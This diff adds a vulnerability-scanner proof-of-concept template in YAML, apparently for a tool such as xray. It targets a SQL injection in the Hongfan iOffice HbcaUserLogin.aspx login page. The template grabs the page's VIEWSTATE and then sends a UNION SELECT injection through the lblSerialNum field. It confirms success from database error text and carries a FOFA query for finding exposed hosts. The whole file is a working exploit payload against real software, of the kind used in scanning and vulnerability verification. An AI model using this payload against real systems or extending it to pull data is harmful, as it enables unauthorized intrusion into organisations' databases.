@@ -1,0 +1,25 @@
+id: poc-yaml-hongfan-ioffice-hbcauserlogin-aspx-sqli
+info:
+  name: 红帆ioffice HbcaUserLogin.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ioffice/Identity/HbcaUserLogin.aspx
+  expression: status_code == 200
+  output:
+  - regex_match(body,"name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\"")
+- method: POST
+  path: /ioffice/Identity/HbcaUserLogin.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: __EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE={{.VIEWSTATE}}&__VIEWSTATEGENERATOR=CBF22729&btVerify=&lblSerialNum=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"iOffice")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
